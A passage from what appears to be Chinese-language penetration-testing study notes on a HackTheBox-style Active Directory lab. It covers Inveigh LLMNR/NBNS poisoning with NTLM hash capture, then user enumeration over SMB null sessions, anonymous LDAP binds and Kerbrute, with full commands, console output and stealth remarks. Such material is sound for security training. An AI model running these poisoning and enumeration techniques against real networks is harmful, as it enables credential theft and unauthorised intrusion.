class="line">[*] Press any key to stop console output</span><br><span class="line">WARNING: [-] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] Error starting HTTP listener</span><br><span class="line">WARNING: [!] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] Exception calling <span class="string">&quot;Start&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An attempt was made to access a</span></span><br><span class="line"><span class="string">socket in a way forbidden by its access permissions&quot;</span> <span class="variable">$HTTP_listener</span>.Start()</span><br><span class="line"><span class="function">[+] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM) request academy<span class="literal">-ea-web0</span>.local received from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">spoofer</span> <span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T19</span>:<span class="number">26</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM) request academy<span class="literal">-ea-web0</span>.local received from <span class="number">172.16</span>.<span class="number">5.125</span> </span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>more</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Invoke-Inveigh</span> Y <span class="literal">-NBNS</span> Y <span class="literal">-LLMNR</span> Y <span class="literal">-HTTP</span> Y <span class="literal">-HTTPS</span> Y <span class="literal">-SMB</span> Y <span class="literal">-ConsoleOutput</span> Y <span class="literal">-FileOutput</span> Y</span><br></pre></td></tr></table></figure><h3 id="C-Inveigh-InveighZero"><a href="#C-Inveigh-InveighZero" class="headerlink" title="C# Inveigh (InveighZero)"></a>C# Inveigh (InveighZero)</h3><p>Inveigh 的 PowerShell 版本是原始版本，不再更新。工具作者维护 C# 版本，该版本结合了原始 PoC C# 代码和 PowerShell 版本中大部分代码的 C# 端口。</p><p>运行 Inveigh.exe</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\Inveigh.exe</span><br><span class="line"></span><br><span class="line">[*] Inveigh <span class="number">2.0</span>.<span class="number">4</span> [<span class="type">Started</span> <span class="number">2022</span>-<span class="number">02</span>-<span class="number">28</span><span class="type">T20</span>:<span class="number">03</span>:<span class="number">28</span> | <span class="type">PID</span> <span class="number">6276</span>]</span><br><span class="line">[+] Packet Sniffer Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Listener Addresses [<span class="type">IP</span> <span class="number">0.0</span><span class="type">.0.0</span> | <span class="type">IPv6</span> ::]</span><br><span class="line">[+] Spoofer Reply Addresses [<span class="type">IP</span> <span class="number">172.16</span><span class="type">.5.25</span> | <span class="type">IPv6</span> <span class="type">fe80</span>::<span class="type">dcec</span>:<span class="number">2831</span>:<span class="number">712</span><span class="type">b</span>:<span class="type">c9a3</span>%<span class="number">8</span>]</span><br><span class="line">[+] Spoofer Options [<span class="type">Repeat</span> <span class="type">Enabled</span> | <span class="type">Local</span> <span class="type">Attacks</span> <span class="type">Disabled</span>]</span><br><span class="line">[ ] DHCPv6</span><br><span class="line">[+] DNS Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] ICMPv6</span><br><span class="line">[+] LLMNR Packet Sniffer [<span class="type">Type</span> <span class="type">A</span>]</span><br><span class="line">[ ] MDNS</span><br><span class="line">[ ] NBNS</span><br><span class="line">[+] HTTP Listener [<span class="type">HTTPAuth</span> <span class="type">NTLM</span> | <span class="type">WPADAuth</span> <span class="type">NTLM</span> | <span class="type">Port</span> <span class="number">80</span>]</span><br><span class="line">[ ] HTTPS</span><br><span class="line">[+] WebDAV [<span class="type">WebDAVAuth</span> <span class="type">NTLM</span>]</span><br><span class="line">[ ] Proxy</span><br><span class="line">[+] LDAP Listener [<span class="type">Port</span> <span class="number">389</span>]</span><br><span class="line">[+] SMB Packet Sniffer [<span class="type">Port</span> <span class="number">445</span>]</span><br><span class="line">[+] File Output [<span class="type">C</span>:\<span class="type">Tools</span>]</span><br><span class="line">[+] Previous Session Files (Not Found)</span><br><span class="line">[*] Press ESC to enter/<span class="keyword">exit</span> interactive console</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTP listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line">[!] Failed to <span class="built_in">start</span> HTTPv6 listener on port <span class="number">80</span>, check IP and port usage.</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">31</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[ ] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">mDNS</span></span>(QM)(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0.local</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">disabled</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">03</span>:<span class="number">32</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br></pre></td></tr></table></figure><p>带有<code>[+]</code>的选项是启用选项，默认情况下启用，而带有<code>[ ]</code>的选项是禁用的。</p><p>在 Inveigh 运行时按下<code>esc</code>键进入控制台</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[+] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(A) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">response</span> <span class="type">sent</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from fe80::f098:<span class="number">4</span>f63:<span class="number">8384</span>:d1d0%<span class="number">8</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[-] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">LLMNR</span></span>(AAAA) request [<span class="type">academy</span>-<span class="type">ea</span>-<span class="type">web0</span>] from <span class="number">172.16</span>.<span class="number">5.125</span> [<span class="type">type</span> <span class="type">ignored</span>]</span><br><span class="line"><span class="function">[<span class="type">.</span>] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">TCP</span></span>(<span class="number">1433</span>) SYN packet from <span class="number">172.16</span>.<span class="number">5.125</span>:<span class="number">61310</span></span><br><span class="line"><span class="function">[<span class="type">.</span>] [<span class="number">20</span>:<span class="number">10</span>:<span class="number">24</span>] <span class="title">TCP</span></span>(<span class="number">1433</span>) SYN packet from <span class="number">172.16</span>.<span class="number">5.125</span>:<span class="number">61311</span></span><br></pre></td></tr></table></figure><p>HELP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C(<span class="number">0</span>:<span class="number">0</span>) NTLMv1(<span class="number">0</span>:<span class="number">0</span>) NTLMv2(<span class="number">3</span>:<span class="number">9</span>)&gt; HELP</span><br><span class="line"></span><br><span class="line">=============================================== Inveigh Console Commands ===============================================</span><br><span class="line"></span><br><span class="line">Command                           Description</span><br><span class="line">========================================================================================================================</span><br><span class="line">GET CONSOLE                     | get queued console output</span><br><span class="line">GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses</span><br><span class="line">GET LOG                         | get log entries; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1                      | get captured NTLMv1 hashes; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV2                      | get captured NTLMv2 hashes; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to <span class="keyword">filter</span> results</span><br><span class="line">GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames <span class="keyword">for</span> captured NTLMv1 hashes</span><br><span class="line">GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames <span class="keyword">for</span> captured NTLMv2 hashes</span><br><span class="line">GET CLEARTEXT                   | get captured cleartext credentials</span><br><span class="line">GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials</span><br><span class="line">GET REPLYTODOMAINS              | get ReplyToDomains <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOHOSTS                | get ReplyToHosts <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOIPS                  | get ReplyToIPs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET REPLYTOMACS                 | get ReplyToMACs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREDOMAINS               | get IgnoreDomains <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREHOSTS                 | get IgnoreHosts <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREIPS                   | get IgnoreIPs <span class="keyword">parameter</span> startup values</span><br><span class="line">GET IGNOREMACS                  | get IgnoreMACs <span class="keyword">parameter</span> startup values</span><br><span class="line"><span class="built_in">SET</span> CONSOLE                     | <span class="built_in">set</span> Console <span class="keyword">parameter</span> value</span><br><span class="line"><span class="built_in">HISTORY</span>                         | get command <span class="built_in">history</span></span><br><span class="line">RESUME                          | resume real time console output</span><br><span class="line">STOP                            | stop Inveigh</span><br></pre></td></tr></table></figure><hr><h1 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h1><p>Skip 分析密码策略</p><p>如果您在内部计算机上但没有有效的域凭据，则可以在域控制器上查找 SMB NULL 会话或 LDAP 匿名绑定。这两种方法都可以让您获得 Active Directory 中所有用户的准确列表和密码策略</p><blockquote><p>如果无法使用以下的任何方法创建有效的用户名列表，可以从外部信息收集并搜索公司电子邮件地址或使用<a href="https://github.com/initstring/linkedin2username">linkedin2username</a>等工具从公司的 LinkedIn 页面中混合可能的用户名。</p></blockquote><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB NULL Session 允许未经身份验证的攻击者从域中检索信息，例如用户、组、计算机、用户帐户属性和域密码策略的完整列表。</p><p>TCP 445: 现代 SMB（如 SMBv2 和 SMBv3）的主要端口，用于直接通过 TCP&#x2F;IP 进行通信，无需 NetBIOS 支持。</p><p>TCP&#x2F;UDP 137-139: 基于 NetBIOS 的旧式 SMB 通信端口，主要用于 SMBv1：</p><ul><li>UDP 137: NetBIOS 名称服务，用于名称解析</li><li>UDP 138: NetBIOS 数据报服务，用于浏览网络信息</li><li>TCP 139: NetBIOS 会话服务，用于实际数据传输</li></ul><h3 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ rpcclient -U &quot;&quot; -N 172.16.5.5</span><br><span class="line"># -U uname%passwd</span><br><span class="line"></span><br><span class="line">rpcclient $&gt; enumdomusers </span><br><span class="line">user:[administrator] rid:[0x1f4]</span><br><span class="line">user:[guest] rid:[0x1f5]</span><br><span class="line">user:[krbtgt] rid:[0x1f6]</span><br><span class="line">user:[lab_adm] rid:[0x3e9]</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="enum4linux"><a href="#enum4linux" class="headerlink" title="enum4linux"></a>enum4linux</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux -U 172.16.5.5  | grep &quot;user:&quot; | cut -f2 -d&quot;[&quot; | cut -f1 -d&quot;]&quot;</span><br><span class="line"># [-U uname [-P passwd ｜-H NTLM_hash]]</span><br><span class="line"></span><br><span class="line">administrator</span><br><span class="line">guest</span><br><span class="line">krbtgt</span><br><span class="line">lab_adm</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="enum4linux-ng"><a href="#enum4linux-ng" class="headerlink" title="enum4linux-ng"></a>enum4linux-ng</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ enum4linux-ng -U 172.16.5.5 | grep &quot;username:&quot; | cut -d &#x27;:&#x27; -f2 | tr -d &#x27; &#x27;</span><br><span class="line"># [-U uname [-P passwd ｜-H NTLM_hash]]</span><br></pre></td></tr></table></figure><h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 --users</span><br><span class="line"># [-u uname -p passwd]</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol） 是一种用于访问和管理目录服务的协议。</p><p>TCP 389: 标准的未加密 LDAP 通信端口</p><p>TCP 636: 用于加密通信（LDAPS，LDAP over SSL&#x2F;TLS）的端口</p><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -h 172.16.5.5 -x -b &quot;DC=INLANEFREIGHT,DC=LOCAL&quot; -s sub &quot;(&amp;(objectclass=user))&quot;  | grep sAMAccountName: | cut -f2 -d&quot; &quot;</span><br><span class="line"># [-D &quot;uname@INLANEFREIGHT.LOCAL&quot; -W &quot;uname&quot;]</span><br><span class="line"></span><br><span class="line">guest</span><br><span class="line">ACADEMY-EA-DC01$</span><br><span class="line">ACADEMY-EA-MS01$</span><br><span class="line">ACADEMY-EA-WEB01$</span><br><span class="line">htb-student</span><br><span class="line">avazquez</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="windapsearch"><a href="#windapsearch" class="headerlink" title="windapsearch"></a>windapsearch</h3><p><a href="https://github.com/ropnop/windapsearch">Windapsearch</a>是一个方便的 Python 脚本，我们可以使用它通过 LDAP 查询从 Windows 域中枚举用户、组和计算机。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ ./windapsearch.py --dc-ip 172.16.5.5 -u &quot;&quot; -U</span><br><span class="line"># [-D &quot;CN=uname,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot; -W &quot;passwd&quot;]</span><br><span class="line"></span><br><span class="line">[+] No username provided. Will try anonymous bind.</span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]...success! Binded as: </span><br><span class="line">[+] None</span><br><span class="line"></span><br><span class="line">[+] Enumerating all AD users</span><br><span class="line">[+]Found 2906 users: </span><br><span class="line"></span><br><span class="line">cn: Guest</span><br><span class="line"></span><br><span class="line">cn: Htb Student</span><br><span class="line">userPrincipalName: htb-student@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Annie Vazquez</span><br><span class="line">userPrincipalName: avazquez@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Paul Falcon</span><br><span class="line">userPrincipalName: pfalcon@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Fae Anthony</span><br><span class="line">userPrincipalName: fanthony@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h2><h3 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h3><p>Kerbrute 工具使用[Kerberos 预身份验证](<a href="https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos">https://ldapwiki.com/wiki/Wiki.jsp?page=Kerberos</a> Pre-Authentication)，这是一种更快、更隐蔽的密码喷洒方法。此方法不会生成 Windows 事件 ID <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625">4625：帐户登录失败</a>或经常被监视的登录失败。该工具在没有 Kerberos 预身份验证的情况下向域控制器发送 TGT 请求以执行用户名枚举。如果 KDC 回复<code>PRINCIPAL UNKNOWN</code>错误，则用户名无效。每当 KDC 提示进行 Kerberos 预身份验证时，都表示用户名存在，该工具会将其标记为有效。这种用户名枚举方法不会导致登录失败，也不会锁定帐户。但是，一旦有了有效用户列表并转而使用此工具进行密码喷洒，失败的 Kerberos 预身份验证尝试将计入帐户的登录失败帐户数，并可能导致帐户锁定。</p><p>Kerbrute 进行用户名枚举将生成事件 ID <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768">4768：已请求 Kerberos 身份验证票证 (TGT) </a>（仅当通过组策略启用<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-kerberos-event-logging">Kerberos 事件日志记录</a>时才会触发此事件）。防御者可以调整其 SIEM 工具以查找此事件 ID 的涌入，这可能表明存在攻击。</p><blockquote><p>如果从内部网络中的位置根本无法访问，可以用<code>Kerbrute</code>来枚举有效的 AD 帐户并进行密码喷洒。</p></blockquote><p>美姓名统计字典: <a href="https://github.com/insidetrust/statistically-likely-usernames">statisticsly-likely-usernames</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 